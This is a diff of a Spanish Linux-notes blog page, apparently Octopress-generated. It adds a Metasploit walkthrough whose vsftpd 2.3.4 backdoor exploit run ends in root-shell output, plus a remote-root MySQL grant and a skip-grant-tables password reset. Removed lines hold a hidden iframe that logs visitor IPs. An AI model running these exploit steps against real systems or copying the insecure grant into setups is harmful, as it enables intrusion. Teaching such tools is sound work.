-<p>Colocar en el sidebar un blogroll</p>
+<p>Acceso remoto a mysql con el usuario root:</p>
 
-<p>Crear el fichero:</p>
+<blockquote><p># nano /etc/mysql/my.cnf</p></blockquote>
 
-<blockquote><p>$ nano source/_includes/asides/blog_roll.html</p></blockquote>
+<p>Comentar la linea:</p>
 
-<p>Con el siguiente contenido, adaptado según gustos:</p>
-
-<pre><code>&lt;section&gt;
-
-  &lt;h1&gt;Blogs útiles&lt;/h1&gt;
-
-  &lt;ul&gt;
-
-      &lt;li&gt;&lt;a href="http://distrowatch.com"&gt;distrowatch&lt;/a&gt;&lt;/li&gt;
-
-      &lt;li&gt;&lt;a href="http://es.wikipedia.org/wiki/Lista_de_n%C3%BAmeros_de_puerto"&gt;Listado de puertos&lt;/a&gt;&lt;/li&gt;
-
-      &lt;li&gt;&lt;a href="http://livecdlist.com/"&gt;LiveCDs&lt;/a&gt;&lt;/li&gt;
-
-   &lt;/ul&gt;
-
-&lt;/section&gt;
+<pre><code>#bind-address           = 127.0.0.1
 </code></pre>
 
-<p>Editar:</p>
+<p>Reiniciar el servicio:</p>
 
-<blockquote><p>$nano _config.yml</p></blockquote>
+<blockquote><p># /etc/init.d/mysql restart</p></blockquote>
 
-<p>Y añadir asides/blog_roll.html a la linea:</p>
+<p>Entrar en el prompt de mysql y otorgar privilegios:</p>
 
-<pre><code>default_asides: [asides/recent_posts.html, asides/twitter.html, asides/blog_roll.html]
+<blockquote><p># mysql -u root -p</p></blockquote>
+
+<p>Entrar la contraseña y:</p>
+
+<pre><code>mysql&gt; GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'la_contraseña' WITH GRANT OPTION;
+
+mysql&gt; FLUSH PRIVILEGES;
+
+mysql&gt; exit
 </code></pre>
 
 <p>7.-</p>
 
-<p>Modificar el &#8220;Posted by&#8221; por &#8220;Escrito por&#8221;</p>
+<p>Solucionar:ERROR 1045 (28000): Access denied for user &#8216;root&#8217;@&#8217;localhost&#8217; (using password: NO)</p>
 
-<blockquote><p>$ nano source/_includes/post/author.html</p></blockquote>
+<blockquote><p># /etc/init.d/mysql stop (Detener el servicio)</p>
 
-<p>Modificar la linea que empieza por &#8220;if author&#8221;:</p>
+<p># mysqld_safe &#8211;user=mysql &#8211;skip-grant-tables (Saltar privilegios de MySQL)</p>
 
-<pre><code>&lt;span class="byline author vcard"&gt;Escrito por &lt;span class="fn"&gt;&lt;/span&gt;&lt;/span&gt;
+<p>$ mysql (En otra terminal entrar en MySQL)</p></blockquote>
+
+<p>mysql> use mysql (Enrar en la BDs mysql)</p>
+
+<p>mysql> UPDATE user SET Password=PASSWORD(&#8216;12345&#8217;) WHERE user=&#8217;root&#8217;;(Actualizar el campo Password del usuario root)</p>
+
+<p>mysql> exit (Salir)</p>
+
+<blockquote><p>$ mysql -u root -p (Entrar en MySQL)</p></blockquote>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/mv/">Mv</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-01-28T17:51:00+01:00" pubdate data-updated="true">28-01-2014</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Mover o renombrar archivos o directorios</p>
+
+<blockquote><p>$ mv archivo archivo2 (renombrar &#8220;archivo&#8221; a &#8220;archivo2&#8221;)</p>
+
+<p>$ mv /home/usuario/index.html /var/www/  (mover archivo a otro directorio)</p>
+
+<p>$ mv -i (Pide confirmación de sobreescritura si existe el archivo o directorio)</p>
+
+<p>$ mv -f (Sobreescribe sin preguntar)</p></blockquote>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/mutt/">Mutt</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-01-28T17:51:00+01:00" pubdate data-updated="true">28-01-2014</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Gestión del correo por consola</p>
+
+<p>Editar /home/usuario/.muttrc y añadir:</p>
+
+<p>set imap_user = &#8216;tu-correo@gmail.com&#8217;</p>
+
+<p>set imap_pass = &#8216;contraseña&#8217;</p>
+
+<p>set spoolfile = imaps://imap.gmail.com:993/INBOX</p>
+
+<p>set folder = imaps://imap.gmail.com:993</p>
+
+<p>set record=”imaps://imap.gmail.com/[Gmail]/Sent Mail”</p>
+
+<p>set postponed=”imaps://imap.gmail.com/[Gmail]/Drafts”</p>
+
+<p>set header_cache=”~/.mutt/cache/headers”</p>
+
+<p>set message_cachedir=”~/.mutt/cache/bodies”</p>
+
+<p>set certificate_file=~/.mutt/certificates</p>
+
+<p>Guardar.</p>
+
+<pre><code># mutt  (Para arrancar la aplicación en ncurses)
+
+$ echo | mutt -a paquete.tar.gz -s 'el paquete' -c juanito@gmail.com -b     pedrito@gmail.com  (enviar un paquete[-a], asunto[-s], carbon copy[cc] y    Blind Carbon Copy[bcc]
+
+$ mutt -s “asunto” destinatario@correo.com &lt;&lt;&lt; “mensaje a enviar”
+</code></pre>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/music123/">Music123</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-01-28T17:51:00+01:00" pubdate data-updated="true">28-01-2014</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Reproductor de música.</p>
+
+<blockquote><p>$ music123 tema.mp3</p>
+
+<p>$ music123 tema1.mp3 tema2.wav tema3.ogg (Reproducir varios títulos)</p>
+
+<p>$ music123 -z -r . (Reproducir todos los temas del presente directorio [r .] de forma aleatoria [z])</p>
+
+<p>$ music123 -Z -q -r /rock (Reproducir sin fin [Z] el directorio especificado y sin mostrar salida en la consola [q])</p>
+
+<p>$ music123 -d 2 -r . (esperar 2 segundos entre tema y tema)</p>
+
+<p>$ music123 -r /rock tema1.mp3 /folk tema2.wav (Reproducir dos temas de dos directorios distintos)</p></blockquote>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/mupdf/">Mupdf</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-01-28T17:51:00+01:00" pubdate data-updated="true">28-01-2014</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Visor de archivos pdf</p>
+
+<blockquote><p>$ mupdf -b 8 -r 150 archivo.pdf (con la máxima calidad [de 0 a 8] y a 150 dpi de resolución [por defecto 72] si el pdf requiriese contraseña se añadiría con “-p contraseña”)</p></blockquote>
+
+<p>Arrancada la aplicación, algunas teclas de control son:</p>
+
+<pre><code>L M (Voltea el pdf)
+
+h j k l (scroll arriba/abajo y derecha/izquierda)
+
++ - (Aumentar/diminuir medida del texto)
+
+15g (Ir a la página 15)
+
+/ (Abre diálogo “buscar texto”)
+
+n N (Ir a la siguiente/anterior busqueda)
+
+. , (Página siguiente, página anterior)
+</code></pre>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/multitail/">Multitail</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-01-28T17:51:00+01:00" pubdate data-updated="true">28-01-2014</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Abrir en una ventana varios procesos tail.</p>
+
+<blockquote><p>$ multitail /var/log/messagess /var/log/apache2/access.log</p>
+
+<p>$ multitail -R 2 -l &#8220;netstat -t&#8221; -ci green /var/log/apache2/access.log -ci yellow /var/log/apache2/error.log</p>
+
+<p>$ multitail -a netstat.log -R 2 -l &#8220;netstat -t tcp&#8221; /var/log/apache/access.log</p></blockquote>
+
+<p>Algunas opciones:</p>
+
+<p>-ci red (muestra los log en rojo)</p>
+
+<p>-R 2     (actualiza cada 2 segundo)</p>
+
+<p>-l &#8220;comando&#8221;  (incluir un comando)</p>
+
+<p>-a archivo.log  (crear un archivo con los resultados del comando)</p>
+
+<p>-I  (muestra el log precedido de la &#8220;i&#8221; mayuscula en la misma ventana que el anterior)</p>
+
+<p>-s 2   (Mostrar el resultado en dos columnas)</p>
+
+<p>-sn 2,3  (Mostrar 2 resultados en la 1ª columna y 3 en la 2ª)</p>
+
+<p>Notas:</p>
+
+<pre><code>F1 (abrir la ayuda)
+
+^g (cerrar ventana ayuda)
+
+b   (selecionar proceso)
+
+q   (cerrar ventana proceso)
+
+v   (Cambiar la orientación horizontal/vertical)
+</code></pre>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/mtr/">Mtr</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-01-28T17:51:00+01:00" pubdate data-updated="true">28-01-2014</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Aplicación que combina las funcionalidades de traceroute y ping, probando cada uno de los saltos que hay desde que un paquete se envía hasta que llega a su destino.</p>
+
+<blockquote><p>$ mtr tuxapuntes.com</p></blockquote>
+
+<p>Atajos mientras está la aplicación ejecutándose:</p>
+
+<p>h ayuda</p>
+
+<p>d modo de visualización</p>
+
+<p>r reiniciar</p>
+
+<p>o orden de los campos</p>
+
+<p>q salir</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/msfconsole/">Msfconsole</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-01-28T17:51:00+01:00" pubdate data-updated="true">28-01-2014</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>[metasploit]. Consola centralizada con acceso a todo las opciones disponibles de Metasploit Framework, única soportada y estable con soporte para de edición de lineas (readline), que permite tabulacion y ejecución de comandos externos.</p>
+
+<p>Uso de comandos externos: Lanzar un ping a un equipo o nmap:</p>
+
+<pre><code>msf &gt; ping -c 1 192.168.1.10
+
+msf &gt; nmap 192.168.1.10
 </code></pre>
 
-<p>8.-</p>
+<p>Obtener ayuda:</p>
 
-<p>Mostrar datos del visitante de la web:</p>
-
-<p>Crear:</p>
-
-<blockquote><p>$ nano octopress/source/_includes/asides/ip_visitante.html</p></blockquote>
-
-<p>Con el siguiente contenido:</p>
-
-<pre><code>&lt;section&gt;
-
-        &lt;h1&gt;Datos visitante&lt;/h1&gt;
-
-        &lt;script type="text/javascript" src="http://boastology.com/tools/ip2c/?im=1&amp;cn=1&amp;ip=1"&gt;&lt;/script&gt;
-
-&lt;/section&gt;
+<pre><code>msf &gt; help
 </code></pre>
 
-<p>Las opciones de la url, aunque no siempre funcionan correctamente, son:</p>
+<p>Mostrar módulos disponibles:</p>
 
-<pre><code>im=1 (1 mostrar bandera, 0 no mostrar)
-
-cn=1 (1 mostrar nombre país, 0 no mostrar)
-
-ip=1 (1 IP, 0 no mostrar)
+<pre><code>msf &gt; show
 </code></pre>
 
-<blockquote><p>$ nano _config.yml</p></blockquote>
+<p>Mostrar módulos auxiliares [scanners, modulos de denial of service, fuzzers&#8230;]:</p>
 
-<p>Y añadir a la linea default_asides el archivo según el lugar que queremos que ocupe en el sidebar [en tercer lugar en este ejemplo]:</p>
-
-<pre><code>default_asides: [asides/num_entradas.html, asides/recent_posts.html, asides/ip_visitante.html]
+<pre><code>msf &gt; show auxiliary
 </code></pre>
 
-<p>9.-</p>
+<p>Obtener una lista de todos los exploits:</p>
 
-<p>Para especificar una imagen en octopress, la sintaxis es:</p>
-
-<pre><code>&lt;img class="center" src="http://www.lapipaplena.net/wp-content/uploads/2011/06/lapipaplena.png" title="La_Pipa_Plena" &gt;
+<pre><code>msf &gt; show exploits
 </code></pre>
 
-<p>Con medidas determinadas y en la derecha:</p>
+<p>Mostrar listado de los diferentes payloads y para las plataformas disponibles:</p>
 
-<pre><code>&lt;img class="right" src="http://www.lapipaplena.net/wp-content/uploads/2011/06/lapipaplena.png" width="150" height="250" title="La_Pipa_Plena" &gt;
+<pre><code>msf &gt; show payloads
 </code></pre>
 
-<p>10.-</p>
+<p>Nota.- Cuando se está usando un determinado exploit, &#8220;show payloads&#8221; solo mostrará los que son compatibles para ese exploit concreto.</p>
 
-<p>Modificación de colores. Por ejemplo la barra de navegación:</p>
+<p>Seleccionado un módulo especifico, para mostrar las opciones disponibles y/o requeridas para ese módulo concreto.</p>
 
-<blockquote><p>$ nano sass/custom/_colors.scss</p></blockquote>
-
-<p>Buscar la variable $nav-bg, descomentarla (quitarle las dos //) y colocar el código de color escogido:</p>
-
-<pre><code>//$subtitle-color: lighten($header-bg, 58);
-
-$nav-bg: desaturate(lighten(#C68800, 18), 5);
-
-//$nav-bg-front: image-url('noise.png');
+<pre><code>msf exploit(ms08_067_netapi) &gt; show options
 </code></pre>
 
-<p>11.-</p>
+<p>Mostrar objetivos soportados:</p>
 
-<p>Colocar una imagen en el header que previamente habremos copiado en el directorio public/images:</p>
-
-<blockquote><p>$ nano source/stylesheets/screen.css</p></blockquote>
-
-<p>Y pegamos al final:</p>
-
-<pre><code>body &gt; header {
-
-    background-image: url("/images/tux_gnu.png");
-
-    background-color: #333;
-
-    background-position: right center;
-
-    background-repeat: no-repeat;
-
-}
+<pre><code>msf exploit(ms08_067_netapi) &gt; show targets
 </code></pre>
 
-<p>12.-</p>
+<p>Mostrar las opciones avanzadas de un exploit:</p>
 
-<p>Quitar la opción RSS de la barra de navegación:</p>
-
-<blockquote><p>$ nano source/_includes/navigation.html</p></blockquote>
-
-<p>Y borrarlo en la linea &#8220;site.subscribe_rss&#8221;</p>
-
-<p>13.-</p>
-
-<p>Centrar el título del blog:</p>
-
-<blockquote><p>$ nano source/_includes/custom/header.html</p></blockquote>
-
-<p>Y dejarlo:</p>
-
-<pre><code>&lt;hgroup&gt;
-
-  &lt;div align=center&gt;
-
-  &lt;h1&gt;&lt;a href="/"&gt;TRACTATUS ELEMENTALIS&lt;/a&gt;&lt;/h1&gt;
-
-
-
-    &lt;h2&gt;Apuntes sobre bash. Orgasmos con la terminal.&lt;/h2&gt;
-
-  &lt;/div&gt;
-
-
-
-&lt;/hgroup&gt;
+<pre><code>msf exploit(ms08_067_netapi) &gt; show advanced
 </code></pre>
 
-<p>13.-</p>
+<p>Buscar cadenas de texto dentro del módulo</p>
 
-<p>Resolver el error en el rake preview &#8220;WARN  TCPServer Error: Address already in use - bind(2)&#8221;</p>
-
-<blockquote><p>$ lsof -i4000 (Para conocer el pid del proceso)</p>
-
-<p>$ kill -9 PID</p></blockquote>
-
-<p>14.-</p>
-
-<p>Llevar un archivo de las visita al site:</p>
-
-<p>Crear en la carpeta web el archivo:</p>
-
-<p>nano /var/www/getip.php</p>
-
-<p>Con el siguiente contenido:</p>
-
-<pre><code>&lt;?php
-
-$userip = $_SERVER['REMOTE_ADDR'];
-
-$file = fopen('ips_visitantes.txt', 'r');
-
-$filedata = fgets($file);
-
-fclose($file);
-
-$file = fopen('ips_visitantes.txt', 'a');
-
-fwrite($file, "\n$filedatan$userip");
-
-fclose($file);
-
-?&gt; 
+<pre><code>msf &gt; search ms09-001
 </code></pre>
 
-<p>Y luego en la carpeta octopress:</p>
+<p>Buscar información detallada [opciones, objetivos&#8230;.] sobre un determinado modulo</p>
 
-<blockquote><p>$ nano source/_includes/after_footer.html</p></blockquote>
-
-<p>Añadir al final:</p>
-
-<pre><code>&lt;div style="width: 1px; height: 1px; overflow: hidden; position: absolute; left: -1000px"&gt;
-
-&lt;iframe src="http://crontux.homelinux.com/getip.php"&gt;&lt;/iframe&gt;
-
-&lt;/div&gt;
+<pre><code>msf &gt; info dos/windows/smb/ms09_001_write
 </code></pre>
 
-<p>15.-</p>
+<p>Una vez escogido el módulo en particular, seleccionarlo con:</p>
 
-<p>Para que las url se abran en una nueva pestaña.</p>
-
-<blockquote><p>$ nano source/javascripts/links.js</p></blockquote>
-
-<p>Y pegamos:</p>
-
-<pre><code>$(document).ready(function(){
-
-    $('a').each(function() {
-
-        var a = new RegExp('/' + window.location.host + '/');
-
-        if(!a.test(this.href)) {
-
-            $(this).click(function(event) {
-
-                event.preventDefault();
-
-                event.stopPropagation();
-
-                window.open(this.href, '_blank');
-
-            });
-
-        }
-
-    });
-
-});
+<pre><code>msf &gt; use dos/windows/smb/ms09_001_write
 </code></pre>
 
-<blockquote><p>$ nano source/_includes/head.html</p></blockquote>
+<p>Y mirar sus opciones requeridas:</p>
 
-<p>Añadir la linea:</p>
-
-<pre><code>&lt;script src="(( root_url ))/javascripts/links.js"&gt;&lt;/script&gt;
+<pre><code>msf auxiliary(ms09_001_write) &gt; show options
 </code></pre>
 
-<p>Nota.- Los 4 parentesis que abren y cierran el código &#8220;root_url&#8221; han de substituirse por llaves &#8221;  &#8220;.</p>
+<p>Conectar a una Ip y a un puerto:</p>
 
-<p>16.-</p>
-
-<p>Añadir en el sidebar las sección &#8220;Entradas más populares&#8221; [Popular posts]</p>
-
-<blockquote><p>$ cd octopress</p>
-
-<p>$ nano Gemfile</p></blockquote>
-
-<p>Y añadir al final la linea:</p>
-
-<p>gem &#8216;octopress-popular-posts&#8217;</p>
-
-<blockquote><p>$ bundle install</p>
-
-<p>$ bundle exec octopress-popular-posts install</p>
-
-<p>$ nano _config.yml</p></blockquote>
-
-<p>Añadir al final la linea [5 es el número de posts que saldrán]:</p>
-
-<p>popular_posts_count: 5</p>
-
-<p>Y en la linea &#8220;default_asides:&#8221; añadimos en el lugar que deseemos:</p>
-
-<p>default_asides: [&#8230;.ent_posts.html, custom/asides/popular_posts.html,custom/asid&#8230;]</p>
-
-<blockquote><p>$ nano .gitignore</p></blockquote>
-
-<p>Aadir la linea:</p>
-
-<p>.page_ranks</p>
-
-<blockquote><p>$ nano source/_includes_custom/asides/popular_posts.html</p></blockquote>
-
-<p>Y substituir &#8220;Popular posts&#8221; por &#8220;Entradas más vistas&#8221;</p>
-
-<p>Para mantener actualizado el plugin lanzar de vez en cuando:</p>
-
-<blockquote><p>$ bundle exec octopress-popular-posts install</p></blockquote>
-
-<p>17.-</p>
-
-<p>Subir el blog a heroku.</p>
-
-<p>Crear una cuenta en <a href="http://www.heroku.com">http://www.heroku.com</a></p>
-
-<pre><code>$ gem install heroku (Instalar la gema)
-
-$ cd octopress (Entrar en el directorio)
-
-$ heroku create (Pedirá las credenciales de la cuenta)
-
-$ git config branch.master.remote heroku (Implementar el control remoto via git)
-
-$ rake generate (Regenerar el site)
-
-$ git add . (Añadir el proyecto)
-
-$ git commit -m 'site updated' (Commit de los cambios)
-
-$ git push heroku master (Subir el sitio local a heroku)
+<pre><code>msf &gt; connect 192.168.1.10 23
 </code></pre>
 
-<p>Una vez subido por primera vez el sitio, las siguientes modificaciones se reflejarán con:</p>
+<p>Para configurar las opciones del modulo que se está utilizando:</p>
 
-<pre><code>$ rake generate
-
-$ git commit -a -m "pequeño_comentario_de_los_cambios"
-
-$ git push heroku master (En algunas ocasiones es suficiente con "git push")
+<pre><code>msf auxiliary(ms09_001_write) &gt; set RHOST 192.168.1.10
 </code></pre>
+
+<p>Comprobar de nuevo las opciones del módulo</p>
+
+<pre><code>msf auxiliary(ms09_001_write) &gt; show options
+</code></pre>
+
+<p>Mostrar codificaciones disponibles:</p>
+
+<pre><code>msf exploit(ms08_067_netapi) &gt; show encoders
+</code></pre>
+
+<p>Escoger la deseada:</p>
+
+<pre><code>msf exploit(ms08_067_netapi) &gt; set encoder x86/shikata_ga_nai
+</code></pre>
+
+<p>Comprobar si un objetivo es vulnerable a un exploit sin explotar la vulnerabilidad:</p>
+
+<pre><code>msf exploit(ms04_045_wins) &gt; check
+</code></pre>
+
+<p>Para establecer una variable global [setg - save]:</p>
+
+<pre><code>msf &gt; setg RHOST 192.168.1.136
+
+RHOST =&gt; 192.168.1.136
+
+msf &gt; save
+
+Saved configuration to: /root/.msf3/config
+</code></pre>
+
+<p>Suprimir una variable global:</p>
+
+<pre><code>msf &gt; unsetg RHOST
+</code></pre>
+
+<p>Suprimir una variable entrada para un módulo:</p>
+
+<pre><code>msf &gt; unset RHOST
+</code></pre>
+
+<p>Lanzar un exploit:</p>
+
+<pre><code>msf auxiliary(ms09_001_write) &gt; run
+</code></pre>
+
+<p>Salir del módulo:</p>
+
+<pre><code>msf auxiliary(ms09_001_write) &gt; back
+</code></pre>
+
+<p>Cambiar al modo de edición de scripts en ruby:</p>
+
+<pre><code>msf &gt; irb
+</code></pre>
+
+<p>1.-</p>
+
+<p>Algunos comandos relacionados con la base de datos propia de metasploit:</p>
+
+<pre><code>msf &gt; db_status (Mostrar el estado de la conexión a la BDs y nombre)
+
+msf &gt; db_nmap 192.168.1.10 (Lanzar nmap y guardar el resultado en la BDs)
+
+msf &gt; hosts (Muestra todos los informes de la BDs)
+
+msf &gt; hosts 192.168.1.10 (Muestra sólo el informe de la ip especificada)
+
+msf &gt; services (Muestra todos los servicios de la BDs incluso los inactivos)
+
+msf &gt; services -u -R 192.168.1.10 (Muestra los servicios activos [u] del host especificado [R])
+</code></pre>
+
+<p>2.-</p>
+
+<p>Muestra de un scan de puertos:</p>
+
+<pre><code>Exploradores de puertos disponibles:
+
+    msf &gt; search portscan
+
+Nota.- Los escáners y la mayoría de módulos auxiliares usan la opción RHOSTS en vez de RHOST y puede ser un rango de IP [192.168.1.10-192.168.1.50], rangos CIDR (192.168.1.0/24), múltiples rangos separados por comas (192.168.1.0/24, 192.168.3.0/24) y una lista en un archivo con una ip por linea (file:/tmp/hostlist.txt). 
+
+Para escoger el escaneador de puertos a usar:
+
+    msf &gt; use scanner/portscan/tcp
+
+Comprobar si falta algún parámetro [RHOSTS]
+
+    msf auxiliary(tcp) &gt; show options
+
+Entrar la ip donde dirigir el escaneo:
+
+    msf auxiliary(tcp) &gt; set RHOSTS 192.168.1.10
+
+Arancar el escaneo:
+
+    msf auxiliary(tcp) &gt; run
+</code></pre>
+
+<p>Todos los módulos scanner tiene el valor THREADS en &#8220;1&#8221;. Este valor establece el número de subprocesos simultaneos que se utilizan durante la exploración. Un número superior acelera las exploraciones pero aumenta el tráfico en la red. Para modificar el valor:</p>
+
+<pre><code>msf &gt; set THREADS 50
+</code></pre>
+
+<p>3.-</p>
+
+<p>Muestra de un ataque</p>
+
+<p>MSF > use exploit/unix/ftp/vsftpd_234_backdoor</p>
+
+<p>Comprobar parámetros que faltan:</p>
+
+<pre><code>msf exploit(vsftpd_234_backdoor) &gt; show options
+</code></pre>
+
+<p>Entrar el parámetro RHOST [la IP atacada]</p>
+
+<pre><code>msf exploit(vsftpd_234_backdoor) &gt; set RHOST 192.168.1.10
+</code></pre>
+
+<p>Comprobar nuevamente si el parámetro ha entrado correctamente:</p>
+
+<pre><code>msf exploit(vsftpd_234_backdoor) &gt; show options
+</code></pre>
+
+<p>Lanzar el exploit en segundo plano [j] y mostrando una salida positiva en la que se abre una shell en la máquina remota:</p>
+
+<pre><code>msf exploit(vsftpd_234_backdoor) &gt; exploit -j
+
+[*] Exploit running as background job.
+
+[*] Banner: 220 (vsFTPD 2.3.4)
+
+[*] USERR: 331 Please specify the password.
+
+msf exploit(vsftpd_234_backdoor) &gt; [+] Backdoor service has been spawned, handling...
+
+[+] UID: uid=0(root) gid=0(root)
+
+[*] Found shell.
+
+[*] Command shell session 1 opened (192.168.1.15:49654 -&gt; 192.168.1.10:6200) at 2013-07-07 08:06:30 -0400
+</code></pre>
+
+<p>Mostrar las sesiones abiertas [ID de la sesion, puertos abiertos, máquina remota, local&#8230;]:</p>
+
+<pre><code>msf exploit(vsftpd_234_backdoor) &gt; sessions -l
+</code></pre>
+
+<p>Ejecutar un comando en todas las shells abiertas y mostradas con sessions -l:</p>
+
+<pre><code>msf exploit(vsftpd_234_backdoor) &gt; sessions -c ifconfig 
+</code></pre>
+
+<p>Entrar en la session con ID 1:</p>
+
+<pre><code>msf exploit(vsftpd_234_backdoor) &gt; sessions -i 1
+
+[*] Starting interaction with 1...
+</code></pre>
+
+<p>A partir de este punto estamos en una shell clásica de linux del host 192.168.1.10 donde podemos usar todos los comandos propios de dichas shells.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/mrxvt/">Mrxvt</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-01-28T17:51:00+01:00" pubdate data-updated="true">28-01-2014</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Emulador de terminal</p>
+
+<p>Opciones:</p>
+
+<p>-geometry 100x15 (Especificando medidas)</p>
+
+<p>-title &#8220;Terminal linux&#8221; (Especificando título)</p>
+
+<p>-o 20  (Nivel de transparencia. De 0 a 100)</p>
+
+<p>-pixmap imagen (Con una imagen de fondo)</p>
+
+<p>-bg red  (color de fondo)</p>
+
+<p>-fg white (color de fuente)</p>
 </div>
   
   
@@ -1326,43 +1111,43 @@ $ git push heroku master (En algunas ocasiones es suficiente con "git push")
   <ul id="recent_posts">
     
       <li class="post">
-        <a href="/blog/ifne/">ifne</a>
+        <a href="/blog/zypper/">zypper</a>
       </li>
     
       <li class="post">
-        <a href="/blog/ifdata/">ifdata</a>
+        <a href="/blog/zmore/">zmore</a>
       </li>
     
       <li class="post">
-        <a href="/blog/ifconfig/">ifconfig</a>
+        <a href="/blog/zmap/">zmap</a>
       </li>
     
       <li class="post">
-        <a href="/blog/identify/">identify</a>
+        <a href="/blog/zless/">zless</a>
       </li>
     
       <li class="post">
-        <a href="/blog/html/">html</a>
+        <a href="/blog/zip/">zip</a>
       </li>
     
       <li class="post">
-        <a href="/blog/hosts/">hosts</a>
+        <a href="/blog/zgrep/">zgrep</a>
       </li>
     
       <li class="post">
-        <a href="/blog/host-dot-conf/">host.conf</a>
+        <a href="/blog/zfgrep/">zfgrep</a>
       </li>
     
       <li class="post">
-        <a href="/blog/honeyproxy/">honeyproxy</a>
+        <a href="/blog/zenity/">zenity</a>
       </li>
     
       <li class="post">
-        <a href="/blog/hg/">hg</a>
+        <a href="/blog/zegrep/">zegrep</a>
       </li>
     
       <li class="post">
-        <a href="/blog/hexdump/">hexdump</a>
+        <a href="/blog/zdump/">zdump</a>
       </li>
     
   </ul>
